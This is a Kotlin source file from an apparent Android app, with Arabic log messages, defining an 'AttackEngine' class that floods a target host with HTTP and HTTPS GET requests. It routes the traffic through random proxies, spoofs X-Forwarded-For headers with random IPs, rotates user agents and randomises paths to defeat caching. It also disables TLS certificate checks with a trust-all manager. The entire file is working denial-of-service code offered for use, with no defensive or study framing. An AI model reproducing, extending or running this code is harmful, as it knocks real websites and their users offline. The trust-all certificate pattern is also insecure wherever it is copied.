package com.alrufaaey.batapp

import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import kotlin.random.Random

class AttackEngine(
    private val host: String,
    private val isHttps: Boolean,
    private val onRequestSent: (Long) -> Unit,
    private val onLog: (String) -> Unit
) {
    val running = AtomicBoolean(true)
    private val requestCounter = AtomicLong(0)

    private val specialChars = "@#$%&*-_+="

    private fun buildBlock(size: Int): String {
        val sb = StringBuilder(size)
        repeat(size) {
            val choice = Random.nextInt(1, 4)
            when (choice) {
                1 -> sb.append(('A'..'Z').random())
                2 -> sb.append(('a'..'z').random())
                else -> sb.append(('0'..'9').random())
            }
        }
        return sb.toString()
    }

    private fun generateRandomIp(): String {
        return "${Random.nextInt(1, 255)}.${Random.nextInt(1, 255)}.${Random.nextInt(1, 255)}.${Random.nextInt(1, 255)}"
    }

    private fun createSecureConnect(targetHost: String, userAgent: String): String {
        return buildString {
            append("CONNECT $targetHost:443 HTTP/1.1\r\n")
            append("Host: $targetHost:443\r\n")
            append("User-Agent: $userAgent\r\n")
            append("Proxy-Connection: keep-alive\r\n")
            append("Connection: keep-alive\r\n")
            append("X-Forwarded-For: ${generateRandomIp()}\r\n")
            append("\r\n")
        }
    }

    private fun createProxySocket(): Socket? {
        val proxyStr = AttackConfig.PROXIES.random()
        val parts = proxyStr.split(":")
        val pHost = parts[0]
        val pPort = parts[1].toInt()

        return try {
            val sock = Socket()
            sock.soTimeout = 10000
            sock.setOption(java.net.StandardSocketOptions.SO_KEEPALIVE, true)
            sock.setOption(java.net.StandardSocketOptions.TCP_NODELAY, true)
            sock.connect(InetSocketAddress(pHost, pPort), 10000)
            sock
        } catch (e: Exception) {
            null
        }
    }

    private fun getTrustAllSslContext(): SSLContext {
        val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })
        val sslContext = SSLContext.getInstance("TLS")
        sslContext.init(null, trustAllCerts, SecureRandom())
        return sslContext
    }

    fun runHttpsAttack() {
        var sock: Socket? = null
        try {
            sock = createProxySocket() ?: return
            val userAgent = AttackConfig.getRandomUserAgent()
            val connectRequest = createSecureConnect(host, userAgent)
            sock.getOutputStream().write(connectRequest.toByteArray())
            sock.getOutputStream().flush()

            val reader = BufferedReader(InputStreamReader(sock.getInputStream()))
            val firstLine = reader.readLine() ?: ""
            
            if (!firstLine.contains("200")) {
                onLog("فشل البروكسي: $firstLine")
                return
            }

            val sslContext = getTrustAllSslContext()
            val sslSock = sslContext.socketFactory.createSocket(sock, host, 443, true)
            sslSock.soTimeout = 10000

            val startAttack = System.currentTimeMillis()
            val out = sslSock.getOutputStream()
            val input = sslSock.getInputStream()

            while (running.get() && System.currentTimeMillis() - startAttack < 60000) {
                val path = "/" + buildBlock(Random.nextInt(5, 15))
                val request = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $userAgent\r\nConnection: keep-alive\r\n\r\n"
                
                out.write(request.toByteArray())
                out.flush()
                
                val count = requestCounter.incrementAndGet()
                onRequestSent(count)

                // قراءة جزء من الاستجابة لعرضها
                val buffer = ByteArray(1024)
                val read = input.read(buffer)
                if (read != -1) {
                    val resp = String(buffer, 0, if (read > 100) 100 else read).replace("\r\n", " ")
                    onLog("استجابة [$count]: ${resp.take(60)}...")
                }

                Thread.sleep(Random.nextLong(50, 200)) // تقليل الاستهلاك
            }
            sslSock.close()
        } catch (e: Exception) {
            onLog("خطأ HTTPS: ${e.message}")
        } finally {
            try { sock?.close() } catch (e: Exception) {}
        }
    }

    fun runHttpAttack() {
        var sock: Socket? = null
        try {
            sock = createProxySocket() ?: return
            val userAgent = AttackConfig.getRandomUserAgent()
            val startAttack = System.currentTimeMillis()
            val out = sock.getOutputStream()
            val input = sock.getInputStream()

            while (running.get() && System.currentTimeMillis() - startAttack < 60000) {
                val path = "/" + buildBlock(Random.nextInt(5, 15))
                val request = "GET http://$host$path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $userAgent\r\nProxy-Connection: keep-alive\r\n\r\n"
                
                out.write(request.toByteArray())
                out.flush()
                
                val count = requestCounter.incrementAndGet()
                onRequestSent(count)

                val buffer = ByteArray(1024)
                val read = input.read(buffer)
                if (read != -1) {
                    val resp = String(buffer, 0, if (read > 100) 100 else read).replace("\r\n", " ")
                    onLog("استجابة [$count]: ${resp.take(60)}...")
                }

                Thread.sleep(Random.nextLong(50, 200))
            }
        } catch (e: Exception) {
            onLog("خطأ HTTP: ${e.message}")
        } finally {
            try { sock?.close() } catch (e: Exception) {}
        }
    }

    fun stop() {
        running.set(false)
    }
}
